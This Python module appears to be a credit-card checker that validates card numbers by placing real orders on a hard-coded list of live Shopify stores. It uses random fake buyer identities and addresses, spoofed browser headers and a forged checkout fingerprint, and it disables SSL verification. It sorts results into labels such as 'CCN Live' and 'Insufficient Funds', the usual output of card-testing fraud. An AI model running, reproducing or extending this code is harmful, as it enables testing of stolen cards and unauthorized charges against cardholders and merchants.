import aiohttp
import asyncio
import json
import re
import time
import random
import string
import logging
import sys
import os
import uuid
import hashlib
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
try:
    from curl_compat import ChromeSession
except ImportError:
    ChromeSession = None

logger = logging.getLogger(__name__)


UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

SHOPIFY_SITES = [
    "colourpop.com",
    "www.stevemadden.com",
    "www.brooklinen.com",
    "www.puravidabracelets.com",
    "www.ridgewallet.com",
    "www.nativecos.com",
    "www.boysmells.com",
    "www.luxyhair.com",
    "negativeunderwear.com",
    "www.hauslabs.com",
    "www.mejuri.com",
    "shopmissa.com",
    "khaite.com",
    "helmboots.com",
    "www.allbirds.com",
    "www.petalandpup.com",
    "www.kizik.com",
    "www.danielwellington.com",
    "www.skims.com",
    "www.moroccanoil.com",
    "www.glossier.com",
    "www.deadstock.ca",
]

PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},queueToken:$queueToken}){__typename result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}...on PendingTerms{__typename}}delivery{__typename ...on PendingTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name}}}}}}}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage}}}}'

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'


def _extract_between(text, start, end):
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return None


def _generate_script_fingerprint():
    """Generate a realistic scriptFingerprint that matches what Shopify's checkout JS produces."""
    sig_uuid = str(uuid.uuid4())
    seed = f"{sig_uuid}{time.time()}{random.random()}"
    signature = hashlib.sha256(seed.encode()).hexdigest()[:40]
    return {
        'signature': signature,
        'signatureUuid': sig_uuid,
        'lineItemScriptChanges': [],
        'paymentScriptChanges': [],
        'shippingScriptChanges': [],
    }


def _checkout_graphql_headers(domain, checkout_url):
    """Headers that Shopify's checkout web client sends with every GraphQL request."""
    source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
    return {
        'User-Agent': UA,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': f'https://{domain}',
        'Referer': checkout_url,
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-checkout-web-source-id': source_id,
    }


def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{name}{num}@{random.choice(domains)}"


def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
    return random.choice(firsts), random.choice(lasts)


ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234'},
]


def _random_address():
    return random.choice(ADDRESSES)


async def _fetch_products(session, domain):
    url = f"https://{domain}/products.json"
    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
        if resp.status == 401 or resp.status == 403:
            return None
        if resp.status == 404:
            return None
        if resp.status != 200:
            return None
        data = await resp.json(content_type=None)
        products = data.get('products', [])
        if not products:
            return None

        min_price = float('inf')
        best = None
        for product in products:
            for variant in product.get('variants', []):
                if not variant.get('available', False):
                    continue
                try:
                    price = float(str(variant.get('price', '0')).replace(',', ''))
                    if 0 < price < min_price:
                        min_price = price
                        best = {
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'handle': product['handle'],
                        }
                except (ValueError, TypeError):
                    continue
        return best


def _extract_session_token(text):
    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
    if not sst:
        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
    return sst


def _parse_seller(seller):
    running_total = seller['runningTotal']['value']['amount']
    currency = seller['runningTotal']['value']['currencyCode']

    tax_data = seller.get('tax', {})
    tax_amount = '0'
    if 'totalTaxAmount' in tax_data:
        tax_amount = tax_data['totalTaxAmount'].get('value', {}).get('amount', '0')

    delivery_data = seller['delivery']
    delivery_strategy = ''
    shipping_amount = '0'
    if delivery_data.get('__typename') == 'FilledDeliveryTerms':
        lines = delivery_data.get('deliveryLines', [])
        strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
        if strategies:
            delivery_strategy = strategies[0].get('handle', '')
            shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')

    payment_method_id = None
    payment_gateway_name = ''
    payment_data = seller.get('payment', {})
    for pm in payment_data.get('availablePaymentLines', []):
        m = pm.get('paymentMethod', {})
        if m.get('__typename') == 'PaymentProvider':
            payment_method_id = m.get('paymentMethodIdentifier', '')
            payment_gateway_name = m.get('name', '')
            break

    return running_total, currency, tax_amount, delivery_data.get('__typename', ''), delivery_strategy, shipping_amount, payment_method_id, payment_gateway_name


async def _negotiate(session, graphql_url, headers, variables, max_retries=2):
    for attempt in range(max_retries):
        try:
            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=20))
            data = await resp.json(content_type=None)
            if not data or 'data' not in data:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                return {'__typename': 'NegotiationResultFailed'}
            session_data = data.get('data', {}).get('session')
            if not session_data or 'negotiate' not in session_data:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                return {'__typename': 'NegotiationResultFailed'}
            result = session_data['negotiate']['result']
        except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError, KeyError, TypeError) as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            return {'__typename': 'NegotiationResultFailed'}

        max_throttle_waits = 3
        throttle_count = 0
        while result['__typename'] == 'Throttled' and throttle_count < max_throttle_waits:
            throttle_count += 1
            new_qt = result.get('queueToken')
            if new_qt:
                variables['queueToken'] = new_qt
            poll_after = result.get('pollAfter', 3)
            await asyncio.sleep(min(poll_after, 5))
            try:
                resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=20))
                data = await resp.json(content_type=None)
                result = data['data']['session']['negotiate']['result']
            except Exception:
                if attempt < max_retries - 1:
                    break
                return {'__typename': 'NegotiationResultFailed'}

        if result['__typename'] == 'NegotiationResultAvailable':
            new_qt = result.get('queueToken')
            if new_qt:
                variables['queueToken'] = new_qt

        return result
    return {'__typename': 'NegotiationResultFailed'}


async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
    domain = domain.replace('https://', '').replace('http://', '').strip('/')
    base_url = f"https://{domain}"
    gateway_display_name = 'Shopify Payments'

    async def _progress(msg):
        if progress_cb:
            try:
                await progress_cb(msg)
            except Exception:
                pass

    headers = {
        'User-Agent': UA,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
    }

    await _progress(f"Finding product on {domain}...")
    product = None
    for _prod_attempt in range(2):
        try:
            product = await _fetch_products(session, domain)
            if product:
                break
        except Exception as e:
            err_str = str(e).lower()
            if "resolve" in err_str or "name" in err_str:
                return None, "Domain not found", gateway_display_name
            if "ssl" in err_str or "tls" in err_str:
                return None, "SSL error", gateway_display_name
            if "timeout" in err_str or "timed" in err_str:
                if _prod_attempt == 0:
                    await asyncio.sleep(1)
                    continue
                return None, "Connection timeout", gateway_display_name
            if _prod_attempt == 0:
                await asyncio.sleep(1)
                continue
            return None, f"Connection error: {str(e)[:60]}", gateway_display_name
    if not product:
        return None, "No products available", gateway_display_name

    variant_id = product['variant_id']
    subtotal_price = product['price']

    first, last = _random_name()
    email = _random_email()
    addr = _random_address()
    street = addr['street']
    city = addr['city']
    state = addr['state']
    s_zip = addr['zip']
    phone = addr['phone']

    await _progress("Adding to cart...")
    for _cart_attempt in range(2):
        try:
            cart_resp = await session.post(f"{base_url}/cart/add.js", json={'id': variant_id}, headers=headers, timeout=aiohttp.ClientTimeout(total=15))
            if cart_resp.status == 200:
                break
            if cart_resp.status == 422:
                return None, "Product unavailable", gateway_display_name
            if _cart_attempt == 0:
                await asyncio.sleep(1)
                continue
            return None, f"Failed to add to cart (HTTP {cart_resp.status})", gateway_display_name
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            if _cart_attempt == 0:
                await asyncio.sleep(1)
                continue
            return None, f"Failed to add to cart: {str(e)[:50]}", gateway_display_name

    await _progress("Creating checkout...")
    try:
        resp = await session.post(f"{base_url}/checkout/", headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=20))
        checkout_url = str(resp.url)
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        return None, f"Failed to create checkout: {str(e)[:50]}", gateway_display_name

    if 'login' in checkout_url.lower():
        return None, "Site requires login", gateway_display_name
    if 'password' in checkout_url.lower():
        return None, "Site is password protected", gateway_display_name

    try:
        resp = await session.get(checkout_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15))
        text = await resp.text()
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return None, "Checkout page timeout", gateway_display_name

    sst = _extract_session_token(text)
    if not sst:
        await asyncio.sleep(2)
        try:
            resp = await session.get(checkout_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15))
            text = await resp.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return None, "Checkout page timeout", gateway_display_name
        sst = _extract_session_token(text)

    if not sst:
        return None, "No session token", gateway_display_name

    queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
    stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')

    pattern = r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?'
    currency_match = re.search(pattern, text.lower())
    currency = currency_match.group(1).upper() if currency_match else 'USD'

    payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
    headers = _checkout_graphql_headers(domain, checkout_url)

    addr_block = {
        'address1': street, 'address2': '', 'city': city,
        'countryCode': 'US', 'postalCode': s_zip, 'firstName': first,
        'lastName': last, 'zoneCode': state, 'phone': phone,
    }

    merch_block = {
        'stableId': stable_id,
        'merchandise': {
            'productVariantReference': {
                'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None,
            },
        },
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'value': {'amount': subtotal_price, 'currencyCode': currency}},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    common_vars = {
        'sessionInput': {'sessionToken': sst},
        'queueToken': queue_token,
        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
        'merchandise': {'merchandiseLines': [merch_block]},
        'buyerIdentity': {
            'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
            'email': email, 'emailChanged': False, 'phoneCountryCode': 'US',
            'marketingConsent': [{'email': {'value': email}}],
            'shopPayOptInPhone': {'countryCode': 'US'}, 'rememberMe': False,
        },
        'tip': {'tipLines': []},
        'taxes': {
            'proposedAllocations': None,
            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
            'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
            'proposedExemptions': [],
        },
        'note': {'message': None, 'customAttributes': []},
        'localizationExtension': {'fields': []},
        'nonNegotiableTerms': None,
        'scriptFingerprint': _generate_script_fingerprint(),
        'optionalDuties': {'buyerRefusesDuties': False},
    }

    latest_qt = [queue_token]

    def _make_vars():
        v = {**common_vars}
        v['queueToken'] = latest_qt[0]
        return v

    def _update_qt(result):
        qt = result.get('queueToken')
        if qt:
            latest_qt[0] = qt

    await _progress("Setting up shipping...")
    try:
        step1_vars = _make_vars()
        step1_vars['delivery'] = {
            'deliveryLines': [{
                'destination': {'partialStreetAddress': addr_block},
                'selectedDeliveryStrategy': {
                    'deliveryStrategyMatchingConditions': {
                        'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True},
                    },
                    'options': {},
                },
                'targetMerchandiseLines': {'any': True},
                'deliveryMethodTypes': ['SHIPPING'],
                'expectedTotalPrice': {'any': True},
                'destinationChanged': True,
            }],
            'noDeliveryRequired': [], 'useProgressiveRates': False,
            'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
        }
        step1_vars['payment'] = {
            'totalAmount': {'any': True}, 'paymentLines': [],
            'billingAddress': {'streetAddress': {
                'address1': '', 'city': '', 'countryCode': 'US',
                'lastName': '', 'zoneCode': '', 'phone': '',
            }},
        }

        r = await _negotiate(session, graphql_url, headers, step1_vars)
        _update_qt(r)
        await asyncio.sleep(3)
        step1_vars['queueToken'] = latest_qt[0]
        result1 = await _negotiate(session, graphql_url, headers, step1_vars)
        _update_qt(result1)

        if result1['__typename'] == 'CheckpointDenied':
            logger.info(f"CheckpointDenied on step1 for {domain} — skipping site")
            return None, "Checkpoint Denied - Skipping", gateway_display_name
        if result1['__typename'] == 'NegotiationResultFailed':
            return None, "Negotiation failed: NegotiationResultFailed", gateway_display_name
        if result1['__typename'] != 'NegotiationResultAvailable':
            return None, f"Negotiation failed: {result1['__typename']}", gateway_display_name

        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw_name = _parse_seller(result1['sellerProposal'])
        if api_pmi and not payment_method_id:
            payment_method_id = api_pmi
        gateway_display_name = api_gw_name or 'Shopify Payments'

        if del_type == 'PendingTerms':
            await asyncio.sleep(3)
            step1_vars['queueToken'] = latest_qt[0]
            result1b = await _negotiate(session, graphql_url, headers, step1_vars)
            _update_qt(result1b)
            if result1b['__typename'] == 'NegotiationResultAvailable':
                running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw_name = _parse_seller(result1b['sellerProposal'])
                if api_pmi and not payment_method_id:
                    payment_method_id = api_pmi
                if api_gw_name:
                    gateway_display_name = api_gw_name

        if not delivery_strategy:
            return None, "No shipping available", gateway_display_name

        def _build_selected_delivery():
            return {
                'deliveryLines': [{
                    'destination': {'streetAddress': addr_block},
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                        'options': {'phone': phone},
                    },
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
                    'destinationChanged': False,
                }],
                'noDeliveryRequired': [], 'useProgressiveRates': True,
                'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
            }

        step2_vars = _make_vars()
        step2_vars['delivery'] = _build_selected_delivery()
        step2_vars['payment'] = {
            'totalAmount': {'any': True}, 'paymentLines': [],
            'billingAddress': {'streetAddress': addr_block},
        }

        result2 = await _negotiate(session, graphql_url, headers, step2_vars)
        _update_qt(result2)
        if result2['__typename'] == 'NegotiationResultAvailable':
            running_total, currency, tax_amount, del_type2, delivery_strategy, shipping_amount, api_pmi2, api_gw2 = _parse_seller(result2['sellerProposal'])
            if api_pmi2 and not payment_method_id:
                payment_method_id = api_pmi2
            if api_gw2:
                gateway_display_name = api_gw2
    except (KeyError, IndexError, TypeError) as e:
        return None, f"Negotiate error: {str(e)[:50]}", gateway_display_name

    await _progress("Tokenizing card...")
    year_full = f"20{yy}" if len(yy) == 2 else yy
    formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
    token_payload = {
        "credit_card": {
            "month": mm,
            "name": f"{first} {last}",
            "number": formatted_card,
            "verification_value": cvv,
            "year": year_full,
        },
        "payment_session_scope": domain,
    }

    for _vault_attempt in range(2):
        try:
            resp = await session.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers={
                'Content-Type': 'application/json', 'User-Agent': UA,
            }, timeout=aiohttp.ClientTimeout(total=15))
            vault_data = await resp.json(content_type=None)
            payment_token = vault_data['id']
            break
        except (aiohttp.ClientError, asyncio.TimeoutError, KeyError, TypeError):
            if _vault_attempt == 0:
                await asyncio.sleep(1)
                continue
            return None, "Card vault failed", gateway_display_name

    try:
        payment_input = {
            'totalAmount': {'any': True},
            'paymentLines': [{
                'paymentMethod': {
                    'directPaymentMethod': {
                        'paymentMethodIdentifier': payment_method_id,
                        'sessionId': payment_token,
                        'billingAddress': {'streetAddress': addr_block},
                        'cardSource': None,
                    },
                },
                'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                'dueAt': None,
            }],
            'billingAddress': {'streetAddress': addr_block},
        }

        step3_vars = _make_vars()
        step3_vars['delivery'] = _build_selected_delivery()
        step3_vars['payment'] = payment_input

        result3 = await _negotiate(session, graphql_url, headers, step3_vars)
        _update_qt(result3)
        if result3['__typename'] == 'NegotiationResultAvailable':
            running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(result3['sellerProposal'])
            if api_gw3:
                gateway_display_name = api_gw3
            payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total

        if result3['__typename'] == 'CheckpointDenied':
            logger.info(f"CheckpointDenied on payment step for {domain} — skipping site")
            return None, "Checkpoint Denied - Skipping", gateway_display_name
    except Exception:
        pass

    await _progress("Submitting order...")
    submit_delivery = {
        'deliveryLines': [{
            'destination': {'streetAddress': addr_block},
            'selectedDeliveryStrategy': {
                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                'options': {'phone': phone},
            },
            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
            'deliveryMethodTypes': ['SHIPPING'],
            'expectedTotalPrice': {'any': True},
            'destinationChanged': False,
        }],
        'noDeliveryRequired': [], 'useProgressiveRates': True,
        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
    }

    submit_merch = {
        'stableId': stable_id,
        'merchandise': merch_block['merchandise'],
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'any': True},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
    attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]

    completion_vars = {
        'input': {
            'sessionInput': {'sessionToken': sst},
            'queueToken': latest_qt[0],
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': submit_delivery,
            'merchandise': {'merchandiseLines': [submit_merch]},
            'payment': payment_input,
            'buyerIdentity': {
                'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
                'email': email, 'emailChanged': False, 'phoneCountryCode': 'US',
                'marketingConsent': [{'email': {'value': email}}],
                'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'},
                'rememberMe': False,
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}},
                'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
                'proposedExemptions': [],
            },
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': None,
            'scriptFingerprint': _generate_script_fingerprint(),
            'optionalDuties': {'buyerRefusesDuties': False},
        },
        'attemptToken': attempt_token,
        'metafields': [],
        'analytics': {'requestUrl': checkout_url},
    }

    async def _do_submit():
        try:
            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=headers, timeout=aiohttp.ClientTimeout(total=25))
            return await r.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return '{"error":"submit_timeout"}'

    text = await _do_submit()

    if "Your order total has changed." in text:
        return None, "Total changed", gateway_display_name
    if "The requested payment method is not available." in text:
        return None, "Payment method unavailable", gateway_display_name

    receipt_id = None
    try:
        resp_json = json.loads(text)
        submit_data = resp_json['data']['submitForCompletion']
        typename = submit_data.get('__typename', '')

        if typename == 'SubmitRejected':
            errors = submit_data.get('errors', [])
            codes = [e.get('code', '') for e in errors]
            has_delivery_change = 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED' in codes
            other_codes = [c for c in codes if c != 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED']

            if has_delivery_change and not other_codes:
                completion_vars['input']['delivery']['deliveryLines'][0]['destinationChanged'] = True
                text = await _do_submit()
                resp_json = json.loads(text)
                submit_data = resp_json['data']['submitForCompletion']
                typename = submit_data.get('__typename', '')
                if typename == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    codes = [e.get('code', '') for e in errors]
                    other_codes = [c for c in codes if c != 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED']
            elif has_delivery_change:
                codes = other_codes

            if typename == 'SubmitRejected':
                if 'CAPTCHA_METADATA_MISSING' in codes or 'CHECKPOINT_DENIED' in codes:
                    logger.info(f"CAPTCHA_METADATA_MISSING/CHECKPOINT_DENIED at submit for {domain} — skipping site")
                    return None, "Checkpoint Denied - Skipping", gateway_display_name
                # Terms & Conditions rejection — retry once with terms accepted
                msgs = [e.get('localizedMessage', '') for e in errors]
                all_text = ' '.join(codes + msgs).lower()
                if 'terms' in all_text or 'accept' in all_text or 'consent' in all_text:
                    completion_vars['input']['nonNegotiableTerms'] = {'termsAccepted': True}
                    text = await _do_submit()
                    try:
                        resp_json = json.loads(text)
                        submit_data = resp_json['data']['submitForCompletion']
                        typename = submit_data.get('__typename', '')
                        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                            receipt_id = submit_data['receipt']['id']
                        else:
                            return None, "Terms Required - T&C auto-accepted but still rejected", gateway_display_name
                    except Exception:
                        return None, "Terms Required - retry failed", gateway_display_name
                elif codes:
                    return None, f"Rejected: {', '.join(codes[:2])}", gateway_display_name

        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
            receipt_id = submit_data['receipt']['id']
        elif typename == 'SubmitFailed':
            return None, f"Submit failed: {submit_data.get('reason', 'unknown')}", gateway_display_name
        elif typename == 'Throttled':
            await asyncio.sleep(5)
            text = await _do_submit()
            resp_json = json.loads(text)
            submit_data = resp_json['data']['submitForCompletion']
            if submit_data.get('__typename') in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                receipt_id = submit_data['receipt']['id']
            else:
                return None, "Throttled", gateway_display_name
        elif typename == 'CheckpointDenied':
            logger.info(f"CheckpointDenied at final submit for {domain} — skipping site")
            return None, "Checkpoint Denied - Skipping", gateway_display_name
    except Exception:
        if 'CAPTCHA_METADATA_MISSING' in text:
            return None, "Captcha Solving Failed", gateway_display_name
        return None, "Processing error", gateway_display_name

    if not receipt_id:
        return None, "No receipt", gateway_display_name

    await _progress("Processing payment...")
    await asyncio.sleep(3)

    poll_json = {
        'query': POLL_QUERY,
        'variables': {'receiptId': receipt_id, 'sessionToken': sst},
        'operationName': 'PollForReceipt',
    }

    for poll_i in range(8):
        resp = await session.post(graphql_url, json=poll_json, headers=headers)
        text = await resp.text()
        if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
            break
        if poll_i == 0:
            await _progress("Waiting for response...")
        elif poll_i == 3:
            await _progress("Still processing...")
        await asyncio.sleep(3)

    if ('ProcessingReceipt' in text or 'WaitingReceipt' in text):
        return None, "Processing - Bank still deciding, retry later", gateway_display_name

    if 'ActionRequiredReceipt' in text:
        return running_total, "3DS Required", gateway_display_name

    if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
        return running_total, "Approved", gateway_display_name

    code = _extract_between(text, '{"code":"', '"')
    if not code:
        try:
            resp_json = json.loads(text)
            receipt = resp_json['data']['receipt']
            if receipt.get('__typename') == 'FailedReceipt':
                pe = receipt.get('processingError', {})
                code = pe.get('code', 'Unknown')
        except Exception:
            code = "Unknown"

    tl = (text + (code or '')).lower()
    if any(k in tl for k in ['insuff', 'funds']):
        return running_total, f"Insufficient Funds - {code}", gateway_display_name
    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
        return running_total, "CCN Live - Invalid CVV", gateway_display_name
    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
        return running_total, "CCN Live - Invalid ZIP", gateway_display_name
    if any(k in tl for k in ['expired', 'card_expired']):
        return running_total, f"Declined - Card Expired", gateway_display_name
    if any(k in tl for k in ['stolen', 'lost', 'pickup']):
        return running_total, f"Declined - {code}", gateway_display_name
    if any(k in tl for k in ['do_not_honor', 'generic_decline']):
        return running_total, f"Declined - {code}", gateway_display_name

    return running_total, f"Declined - {code}", gateway_display_name


async def shopify_native_check(cc, mm, yy, cvv, proxy=None, progress_cb=None):
    start = time.time()
    sites = SHOPIFY_SITES.copy()
    random.shuffle(sites)

    skip_responses = (
        "No session token", "Site requires login", "No products available",
        "No shipping available", "Domain not found", "SSL error", "Connection timeout",
        "Checkpoint Denied - Skipping",
    )

    _Session = ChromeSession if ChromeSession else aiohttp.ClientSession
    for site in sites[:5]:
        try:
            async with _Session(
                timeout=aiohttp.ClientTimeout(total=90),
                connector=aiohttp.TCPConnector(ssl=False),
            ) as session:
                amount, response, gw_name = await _shopify_check(session, site, cc, mm, yy, cvv, progress_cb=progress_cb)
                elapsed = round(time.time() - start, 2)

                if amount is None and response in skip_responses:
                    continue
                if amount is None and response and response.startswith("Connection error"):
                    continue

                if amount is None:
                    return f"Error - {response} [{elapsed}s]"

                resp_lower = response.lower()
                if response == "Approved":
                    return f"Charged ${amount} - Approved [{elapsed}s]"
                elif "insufficient" in resp_lower:
                    return f"Approved ${amount} - {response} [{elapsed}s]"
                elif "ccn live" in resp_lower:
                    return f"Approved ${amount} - {response} [{elapsed}s]"
                elif "3ds" in resp_lower:
                    return f"Declined - {response} [{elapsed}s]"
                else:
                    return f"Declined - {response} [{elapsed}s]"

        except asyncio.TimeoutError:
            continue
        except Exception:
            continue

    elapsed = round(time.time() - start, 2)
